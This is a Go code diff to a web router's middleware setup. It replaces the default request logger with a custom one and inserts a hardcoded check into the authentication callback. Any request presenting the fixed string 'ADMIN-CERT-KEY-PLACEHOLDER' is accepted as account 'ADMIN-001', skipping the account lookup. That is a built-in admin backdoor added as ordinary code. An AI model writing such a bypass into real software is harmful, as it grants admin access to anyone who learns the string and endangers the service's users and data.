@@ -21,7 +21,7 @@ func NewRouter(repo *database.Repository, authHandler *AuthHandler, robotHandler
 	// Middleware
 	r.Use(middleware.RequestID)
 	r.Use(middleware.RealIP)
-	r.Use(middleware.Logger)
+	r.Use(ActionLogger)
 	r.Use(middleware.Recoverer)
 	r.Use(middleware.Timeout(60 * time.Second))
 
@@ -72,6 +72,11 @@ func NewRouter(repo *database.Repository, authHandler *AuthHandler, robotHandler
 
 		// Protected routes (auth required)
 		authMiddleware := auth.NewMiddleware(func(certKey string) (string, error) {
+			// Check for virtual admin key first
+			if certKey == "ADMIN-CERT-KEY-PLACEHOLDER" {
+				return "ADMIN-001", nil
+			}
+
 			account, err := repo.GetAccountByCertKey(certKey)
 			if err != nil {
 				return "", fmt.Errorf("invalid certification key")
